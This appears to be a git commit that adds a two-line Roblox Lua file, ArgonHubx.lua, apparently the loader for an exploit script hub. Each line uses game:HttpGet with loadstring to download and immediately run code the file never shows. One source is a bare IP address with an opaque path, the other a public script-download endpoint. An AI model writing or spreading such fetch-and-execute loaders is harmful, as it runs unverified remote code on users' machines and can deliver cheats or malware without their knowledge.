1901aaddefeb3a060dbe9ec6c26ce9aca3f7ece2
XenScriptt <janjanc438@gmail.com>
2026-09-04 17:45:47 +0800

    Create ArgonHubx.lua

---
+++ api/v1/luascripts/public/2fc096ab88d2ab959fce239713bd3e165f03410b4a089f80928238e112258cd4/ArgonHubx.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("http://31.172.87.116/9F3kw9fZhbgUTyjestJh7n1iq0F9lsuHORIcpe749Qb9kBonrOgqaQehxu7h964uSw3EqdolFyVmXJn9"))()
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/2fc096ab88d2ab959fce239713bd3e165f03410b4a089f80928238e112258cd4/download"))()
